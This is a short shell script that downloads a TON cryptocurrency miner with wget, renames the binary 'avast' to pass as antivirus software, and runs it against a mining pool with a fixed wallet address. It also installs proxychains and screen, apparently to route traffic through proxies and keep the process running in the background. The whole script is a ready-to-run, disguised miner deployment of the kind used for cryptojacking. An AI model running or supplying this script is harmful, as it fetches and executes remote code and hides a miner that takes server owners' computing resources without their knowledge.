apt update

apt install proxychains

apt install screen -y

wget -q https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-xenial.tar.gz

tar -xvf  danila-miner-2.3.1-ubuntu-xenial.tar.gz

mv danila-miner avast

chmod +x avast 

./avast run ton.de.hashrate.to:4003 EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
